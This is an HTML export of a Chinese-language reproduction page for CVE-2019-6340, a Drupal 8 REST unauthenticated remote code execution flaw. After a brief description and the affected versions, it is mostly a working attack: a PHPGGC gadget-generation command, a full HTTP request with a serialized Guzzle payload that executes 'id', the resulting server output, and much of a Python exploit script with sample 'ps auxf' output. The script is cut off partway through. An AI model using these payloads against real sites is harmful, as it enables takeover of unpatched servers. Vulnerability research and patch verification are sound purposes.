<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-6340drupal-远程代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-6340</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Drupal </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Drupal Core</span><span class="cs9C1B1871">存在一个远程代码执行漏洞。此次，它的目标是</span><span class="cs8926E06">Drupal 8</span><span class="cs9C1B1871">的</span><span class="cs8926E06">REST</span><span class="cs9C1B1871">模块，默认情况下，该模块是禁用了，但是该模块在大多数情况下会被用户使用。</span><span class="cs8926E06">**</span><span class="cs9C1B1871">该漏洞本质上是由于用户使用</span><span class="cs8926E06">Drupal Core RESTful Web Services (rest)</span><span class="cs9C1B1871">时，某些字段类型无法正确清理非格式源中的数据。在某些情况下，这可能导致任意</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码执行。</span><span class="cs8926E06">**</span><span class="cs9C1B1871">此外，我们发现针对该漏洞提出的即时补救措施是不完整的，这可能会导致一种错误的安全感。</span><span class="csE3F655E4">用户可能会根据官方的说明禁用掉</span><span class="cs5BEC2C28">RESTful Web Services </span><span class="csE3F655E4">中的</span><span class="cs5BEC2C28">POST/PATCH</span><span class="csE3F655E4">方法，但是事实上</span><span class="cs5BEC2C28">GET</span><span class="csE3F655E4">方法也能在无任何权限的情况下执行远程代码，所以用户必须执行</span><span class="cs5BEC2C28">Drupal</span><span class="csE3F655E4">的最新的安全更新或者禁用</span><span class="cs5BEC2C28">RESTful Web Services</span><span class="csE3F655E4">服务，否则网站依旧处于风险当中。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Drupal 8.6.x &lt; 8.6.10</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Drupal 8.5.x &lt; 8.5.11</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">触发</span><span class="cs9FB05234">unserialize()</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 192.168.1.25</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/hal+json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 642</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;link&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;link&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;options&quot;: &quot;&lt;SERIALIZED_CONTENT&gt;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;_links&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;href&quot;: &quot;http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">由于</span><span class="cs8926E06">Drupal 8</span><span class="cs9C1B1871">使用</span><span class="cs8926E06"><a class="cs508254C" href="http://docs.guzzlephp.org/en/stable/"><span class="cs4B51D5E4">Guzzle</span></a></span><span class="cs9C1B1871">，我们可以使用</span><span class="cs8926E06">PHPGGC</span><span class="cs9C1B1871">生成有效负载：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ ./phpggc guzzle / rce1</span><span class="cs7FFD2630">系统</span><span class="cs9FB05234">ID --json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &ldquo; O</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">24</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&rdquo; GuzzleHttp \\ Psr7 \\ FnStream \&ldquo;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">33</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&rdquo; \ u0000GuzzleHttp \\ Psr7 \\ FnStream \ u0000methods \&ldquo; ; a</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">5</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; close \&rdquo;; a</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0; O</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">23</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; GuzzleHttp \\ HandlerStack \&rdquo;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">3</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">32</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; \ u0000GuzzleHttp \ \ HandlerStack \ u0000handler \&ldquo;; s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&rdquo; id \&ldquo;; s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">30</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&rdquo; \ u0000GuzzleHttp \\ HandlerStack \ u0000stack \&ldquo;; a</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0; a</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0 ; s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">6</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; system \&rdquo;;}} s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">31</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; \ u0000GuzzleHttp \\ HandlerStack \ u0000cached \&rdquo;; b</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0;} i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">1; s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">7</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; resolve \&rdquo;;}} s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">9</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; _ fn_close \&rdquo;; a</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">{i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">0; r</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">4; i</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">1; s</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">7</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">\&ldquo; resolve \&rdquo;;}}&ldquo;</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">我们可以通过</span><span class="cs8926E06">get</span><span class="cs9C1B1871">请求发送有效载荷</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/hal+json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 642</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;link&quot;: [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;link&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;options&quot;: &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\&quot;;a:1:{s:5:\&quot;close\&quot;;a:2:{i:0;O:23:\&quot;GuzzleHttp\\HandlerStack\&quot;:3:{s:32:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000handler\&quot;;s:2:\&quot;id\&quot;;s:30:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000stack\&quot;;a:1:{i:0;a:1:{i:0;s:6:\&quot;system\&quot;;}}s:31:\&quot;\u0000GuzzleHttp\\HandlerStack\u0000cached\&quot;;b:0;}i:1;s:7:\&quot;resolve\&quot;;}}s:9:\&quot;_fn_close\&quot;;a:2:{i:0;r:4;i:1;s:7:\&quot;resolve\&quot;;}}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&quot;_links&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;type&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;href&quot;: &quot;http://www.0-sec.org/drupal-8.6.9/rest/type/shortcut/default&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">返回值</span></p><p class="cs3A447A38"><span class="cs9FB05234">HTTP/1.1 200 OK</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Link: &lt;...&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Generator: Drupal 8 (https://www.drupal.org)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Drupal-Cache: MISS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/hal+json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 9012</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{...}uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># CVE-2019-6340 Drupal &lt;= 8.6.9 REST services RCE PoC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># 2019 @leonjza</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Technical details for this exploit is available at:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;https://www.drupal.org/sa-core-2019-003</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;https://www.ambionics.io/blog/drupal8-rce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;&nbsp;https://twitter.com/jcran/status/1099206271901798400</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Sample usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># $ python cve-2019-6340.py http://127.0.0.1/ &quot;ps auxf&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;by @leonjza</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># References:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;https://www.drupal.org/sa-core-2019-003</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># &nbsp;https://www.ambionics.io/blog/drupal8-rce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [warning] Caching heavily affects reliability of this exploit.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Nodes are used as they are discovered, but once they are done,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># you will have to wait for cache expiry.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Targeting http://127.0.0.1/...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [+] Finding a usable node id...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [x] Node enum found a cached article at: 2, skipping</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [x] Node enum found a cached article at: 3, skipping</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [+] Using node_id 4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># [+] Target appears to be vulnerable!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># USER &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PID %CPU %MEM &nbsp;&nbsp;&nbsp;VSZ &nbsp;&nbsp;RSS TTY &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STAT START &nbsp;&nbsp;TIME COMMAND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># root &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;49 &nbsp;0.0 &nbsp;0.0 &nbsp;&nbsp;4288 &nbsp;&nbsp;716 pts/0 &nbsp;&nbsp;&nbsp;Ss+ &nbsp;16:38 &nbsp;&nbsp;0:00 sh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># root &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 &nbsp;0.0 &nbsp;1.4 390040 30540 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss &nbsp;&nbsp;15:20 &nbsp;&nbsp;0:00 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;24 &nbsp;0.1 &nbsp;2.8 395652 57912 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;15:20 &nbsp;&nbsp;0:08 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;27 &nbsp;0.1 &nbsp;2.9 396152 61108 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;15:20 &nbsp;&nbsp;0:08 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;31 &nbsp;0.0 &nbsp;3.4 406304 70408 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;15:22 &nbsp;&nbsp;0:04 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;39 &nbsp;0.0 &nbsp;2.7 398472 56852 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;16:14 &nbsp;&nbsp;0:02 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;44 &nbsp;0.2 &nbsp;3.2 402208 66080 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;16:37 &nbsp;&nbsp;0:05 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;56 &nbsp;0.0 &nbsp;2.6 397988 55060 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;16:38 &nbsp;&nbsp;0:01 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;65 &nbsp;0.0 &nbsp;2.3 394252 48460 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;16:40 &nbsp;&nbsp;0:01 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;&nbsp;78 &nbsp;0.0 &nbsp;2.5 400996 51320 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;16:47 &nbsp;&nbsp;0:01 apache2 -DFOREGROUND</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># www-data &nbsp;&nbsp;117 &nbsp;0.0 &nbsp;0.0 &nbsp;&nbsp;4288 &nbsp;&nbsp;712 ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S &nbsp;&nbsp;&nbsp;17:20 &nbsp;&nbsp;0:00 &nbsp;\_ sh -c echo</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import urlparse, urljoin</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def build_url(*args) -&gt; str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Builds a URL</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;f = &#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for x in args:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f = urljoin(f, x)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return f</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def uri_valid(x: str) -&gt; bool:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://stackoverflow.com/a/38020041</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;result = urlparse(x)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return all([result.scheme, result.netloc, result.path])</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def check_drupal_cache(r: requests.Response) -&gt; bool:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check if a response had the cache header.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &#39;X-Drupal-Cache&#39; in r.headers and r.headers[&#39;X-Drupal-Cache&#39;] == &#39;HIT&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def find_article(base: str, f: int = 1, l: int = 100):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Find a target article that does not 404 and is not cached</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while f &lt; l:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u = build_url(base, &#39;/node/&#39;, str(f))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(u)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if check_drupal_cache(r):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;[x] Node enum found a cached article at: {f}, skipping&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f += 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# found an article?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if r.status_code == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return f</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f += 1</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def check(base: str, node_id: int) -&gt; bool:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check if the target is vulnerable.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;&quot;&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;_links&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;href&quot;: f&quot;{urljoin(base, &#39;/rest/type/node/INVALID_VALUE&#39;)}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;target_id&quot;: &quot;article&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;title&quot;: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;value&quot;: &quot;My Article&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 